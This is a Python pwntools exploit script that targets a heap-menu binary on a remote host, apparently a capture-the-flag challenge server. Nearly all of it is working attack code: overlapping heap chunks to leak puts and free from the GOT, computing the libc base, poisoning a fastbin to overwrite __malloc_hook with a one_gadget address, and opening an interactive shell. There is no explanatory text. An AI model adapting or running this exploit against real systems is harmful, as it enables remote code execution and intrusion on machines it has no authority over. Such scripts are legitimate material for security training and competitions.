#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
# io = process('./pwn')
io = remote('394c6c946290cc950ef635bd899fafa1.kr-lab.com', 40002)
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
one_gadget = 0x4526a

def add(data):
    io.sendlineafter('> ', '1')
    io.sendlineafter(':\n', data)
    io.recvuntil('index: ')
    return int(io.recvuntil('\n', drop = True))

def show(index):
    io.sendlineafter('> ', '2')
    io.sendlineafter('index: ', str(index))
    return io.recvuntil('\n', drop = True)

def edit(index, data):
    io.sendlineafter('> ', '3')
    io.sendlineafter('index: ', str(index))
    io.sendline(data)

def delete(index):
    io.sendlineafter('> ', '4')
    io.sendlineafter('index: ', str(index))

if __name__ == '__main__':
    raw_input('debug')
    add('a' * 22) #0
    add('a' * 22) #1
    add('b' * 0x60) #2
    add('b' * 0x60) #3
    delete(0)
    add('c' * 50) #4
    add('d' * 22) #5
    payload = p32(5) + p32(0x21) + p64(elf.got['puts'])
    edit(1, payload)
    puts_addr = u64(show(5).ljust(8, '\x00'))
    # success('puts addr -> {:#x}'.format(puts_addr))
    payload  = p32(5) + p32(0x21) + p64(elf.got['free'])
    edit(1, payload)
    free_addr = u64(show(5).ljust(8, '\x00'))
    # success('free addr -> {:#x}'.format(free_addr))
    libc_base = free_addr - libc.sym['free']
    success('libc base -> {:#x}'.format(libc_base))
    sys = libc_base + libc.sym['system']
    success('system -> {:#x}'.format(sys))
    sh = libc_base + libc.search('/bin/sh').next()
    success('/bin/sh -> {:#x}'.format(sh))
    # malloc the chunk to malloc_hook
    delete(2)
    malloc_hook = 0x3c4b10+libc_base
    edit(3, p64(malloc_hook-27-8))
    raw_input('check the fd of the only fastbin')

    add('e' * 0x60)
    # payload = 'a'*6+p64(0x3e1870+libc_base) + p64(sys)
    # payload += p64(0xa6000 + libc_base) + p64(puts_addr) + p64(0x401066)
    payload = 'a'*19+p64(one_gadget + libc_base)
    payload = payload.ljust(0x60, 'b')
    add(payload)
    raw_input('check the malloc_hook should be system')
    
    #add('one_gadget niubi!')
    io.sendlineafter('> ', '1')

    io.interactive()
    io.close()




